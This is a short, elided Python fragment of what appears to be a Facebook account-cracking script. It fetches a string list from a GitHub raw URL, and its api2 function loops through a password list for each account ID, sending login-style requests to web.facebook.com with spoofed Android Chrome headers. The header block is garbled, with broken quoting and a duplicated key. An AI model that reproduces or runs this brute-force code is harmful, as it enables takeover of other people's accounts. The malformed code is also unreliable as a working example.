...
os.system('xdg-open https://www.facebook.com/AMIN.XM.404?mibextid=ZbWKwL')

android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/main/strings.txt').text.splitlines()
	for line in xx:
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        headers = {"a'authority': 'web.facebook.com',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',authority': 'web.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-DZ,ar;q=0.9,en-DZ;q=0.8,en;q=0.7,fr-DZ;q=0.6,fr;q=0.5,en-US;q=0.4',
    'cache-control': 'max-age=0',
     "Chromium;v=" "116"',
